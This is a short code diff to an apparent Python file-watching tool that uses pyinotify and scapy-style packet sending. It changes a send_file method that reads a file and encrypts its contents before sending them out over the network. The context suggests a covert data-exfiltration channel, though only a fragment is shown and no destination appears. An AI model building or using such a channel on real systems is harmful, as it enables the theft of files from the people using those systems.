@@ -29,9 +29,12 @@ class EventHandler(pyinotify.ProcessEvent):
         send(pkt, verbose=False) 
         time.sleep(0.1)
 
-    def send_file(self, filename):
-        with open(filename) as file:
+    def send_file(self, filepath):
+        with open(filepath) as file:
             data = file.read()
+
+        temp = filepath.split("/")
+        filename = temp[-1]
 
         # Encrypt data first, and then send
         encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
